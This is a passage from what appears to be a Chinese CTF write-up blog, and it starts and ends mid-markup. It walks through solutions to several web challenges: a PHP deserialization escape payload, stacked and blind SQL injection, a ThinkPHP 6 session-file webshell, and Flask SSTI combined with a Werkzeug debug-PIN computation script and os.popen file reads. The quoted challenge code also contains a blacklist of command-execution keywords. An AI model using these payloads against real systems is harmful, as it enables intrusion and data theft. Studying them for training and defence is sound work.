trlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211056046.png" alt="image-20210404211056046"></p><p>可见可以逃逸出来，因此payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211250655.png" alt="image-20210404211250655"></p><p>登录页面 用户名admin 密码任意：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404211322225.png" alt="image-20210404211322225"></p><h3 id="WEB-Blacklist"><a href="#WEB-Blacklist" class="headerlink" title="[WEB]Blacklist"></a>[WEB]Blacklist</h3><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>首先查询，发现和强网杯的很像</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124133764.png" alt="image-20210404124133764"></p><p>因此尝试堆叠注入，过滤字符：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404124229017.png" alt="image-20210404124229017"></p><p>因此无法改名，也无法用预处理语句。</p><p>通过查资料 发现可以利用<code>handler</code>语句</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130143408.png" alt="image-20210404130143408"></p><p>可见flag在<code>FlagHere</code>表</p><h4 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h4><p>构造语句查一下第一行数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line"> 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line"> 通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404130502802.png" alt="image-20210404130502802"></p><p>直接查到了flag。</p><h3 id="WEB-Ezsqli"><a href="#WEB-Ezsqli" class="headerlink" title="[WEB]Ezsqli"></a>[WEB]Ezsqli</h3><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数：</p><p>发现and、or等函数都过滤了：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135430569.png" alt="image-20210404135430569"></p><p>发现<code>^</code>没有过滤，采用<code>^</code>测试注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^0%23</span><br><span class="line">id&#x3D;1^1%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135535230.png" alt="image-20210404135535230"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135616538.png" alt="image-20210404135616538"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135712369.png" alt="image-20210404135712369"></p><p>返回错误</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404135756770.png" alt="image-20210404135756770"></p><p>返回正确。</p><p>发现存在注入。</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140526716.png" alt="image-20210404140526716"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404140614551.png" alt="image-20210404140614551"></p><p>接下来就构造注入语句，因为过滤了or，所以无法使用<code>information_schema</code></p><p>绕过函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">join无列名注入</span><br></pre></td></tr></table></figure><p>构造查表语句：</p><p>判断逻辑：返回Nu1L说明payload为1对，语句成立</p><p>返回Error Occured When Fetch Result payload为0，语句不成立</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查表名：</span><br><span class="line">id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404152201048.png" alt="image-20210404152201048"></p><p>可见表名：f1ag_1s_h3r3_hhhhh</p><p>下面用无列名注入，利用到了ascii位偏移：</p><p>两个字符串比较时利用首字符的ascii码</p><p>核心payload：<code>(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</code></p><p>//子查询之间也可以直接通过<code>&gt;、&lt;、=</code>来进行判断。</p><p>测试字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 1</span><br><span class="line">select 1,2</span><br><span class="line">select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160620528.png" alt="image-20210404160620528"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160633320.png" alt="image-20210404160633320"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160645953.png" alt="image-20210404160645953"></p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160225767.png" alt="image-20210404160225767"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160241590.png" alt="image-20210404160241590"></p><p>可见<code>Nu1L</code>页面的上一位就是我们要查询的值.</p><h4 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404160710227.png" alt="image-20210404160710227"></p><p>成功查询到flag。</p><h3 id="WEB-EasyThinking"><a href="#WEB-EasyThinking" class="headerlink" title="[WEB]EasyThinking"></a>[WEB]EasyThinking</h3><h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419105854.png" alt="image-20210419105853980"></p><p>猜测搜索处存在利用点。扫描目录发现存在<code>www.zip</code>，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本：</p><p>参考：<a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p>参考：<a href="https://xz.aliyun.com/t/8409">https://xz.aliyun.com/t/8409</a></p><p>TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径<code>\runtime\session</code>，文件名为32位就可以，构造后缀为<code>.php</code>的32位字符串，访问<code>sess_</code>+文件名</p><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>从注册的时候开始修改：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419140614.png" alt="image-20210419140614233"></p><p>注册后<code>search</code> 页面 提交key，先写入<code>&lt;?php phpinfo();?&gt;</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141031.png" alt="image-20210419141030952"></p><p>然后访问看下：<code>http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php</code></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141426.png" alt="image-20210419141426271"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419142246.png" alt="image-20210419142246746"></p><p>写入一句话，蚁剑连接发现执行不了命令，看下phpinfo：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419141512.png" alt="image-20210419141512122"></p><p>发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass:</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419145536.png" alt="image-20210419145536851"></p><h3 id="WEB-FlaskApp"><a href="#WEB-FlaskApp" class="headerlink" title="[WEB]FlaskApp"></a>[WEB]FlaskApp</h3><h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419150702.png" alt="image-20210419150702201"></p><p>查看源码发现提示<code>PIN</code> 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419151659.png" alt="image-20210419151659872"></p><p>可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>采用if条件语句防止被过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; </span><br><span class="line">c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419154846.png" alt="image-20210419154846170"></p><p>可以得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span>(<span class="params">FlaskForm</span>):</span></span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm1</span>(<span class="params">FlaskForm</span>):</span></span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>():</span></span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39;</span><br></pre></td></tr></table></figure><p>重点在waf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可见过滤了命令执行常用函数，不能采用命令执行的方式。</p><p>继续读一下必要信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">username #读取&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;&#x2F;本题：flaskweb</span><br><span class="line">modname  #flask.app</span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flask</span><br><span class="line">getattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径</span><br><span class="line">&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br><span class="line">uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line">&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689</span><br><span class="line">get_machine_id()</span><br><span class="line">&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</span><br><span class="line">&#x2F;&#x2F;windows读取注册表：SOFTWARE\\Microsoft\\Cryptography</span><br><span class="line">&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup</span><br><span class="line">&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8</span></span><br><span class="line"><span class="comment"># From https://xz.aliyun.com/t/2553</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377871689&#x27;</span>,<span class="comment">#str(uuid.getnode()), /sys/class/net/ens0/address</span></span><br><span class="line">    <span class="string">&#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>信息修改完整后运行得到 pin码：<code>410-898-797</code></p><p>读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;cat /this_is_the_flag.txt&#x27;</span>).readlines()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419200901.png" alt="image-20210419200900612"></p><p>有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419210056.png" alt="image-20210419210055982"></p><figure 